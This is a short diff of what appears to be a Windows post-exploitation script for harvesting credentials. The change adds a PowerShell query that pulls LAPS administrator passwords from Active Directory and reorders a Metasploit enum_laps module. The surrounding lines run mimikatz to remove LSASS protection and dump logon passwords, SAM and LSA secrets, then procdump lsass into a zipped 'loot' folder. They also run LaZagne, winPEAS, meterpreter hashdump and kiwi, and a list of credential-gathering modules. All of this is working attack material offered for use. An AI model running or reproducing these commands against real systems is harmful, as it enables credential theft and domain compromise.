@@ -4,6 +4,8 @@ try {Invoke-SessionGopher -Thorough}
 catch {$_}
 ./winPEASany_ofs.exe | tee loot/winpeas.txt
 ./lazagne.exe all | tee loot/lazagne.txt
+try {get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd' , 'ms-mcs-admpwdexpirationtime' | tee loot/laps.txt}
+catch {$_}
 ./mimikatz*/mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::Credman" "sekurlsa::Wdigest" "vault::cred /patch" "lsadump::secrets" "exit" | tee mimikatz.txt
 ./procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 Compress-Archive -LiteralPath C:/blood/lsass.dmp -DestinationPath C:/blood/loot/lsass.zip
@@ -23,10 +25,10 @@ hashdump
 load kiwi
 creds_all
 lsa_dump_secrets
+run post/windows/gather/credentials/enum_laps
 run post/windows/gather/credentials/credential_collector
 run post/windows/gather/smart_hashdump
 run post/windows/gather/cachedump
-run post/windows/gather/credentials/enum_laps
 run post/windows/wlan/wlan_profile
 run post/windows/gather/credentials/sso
 run post/windows/gather/credentials/gpp
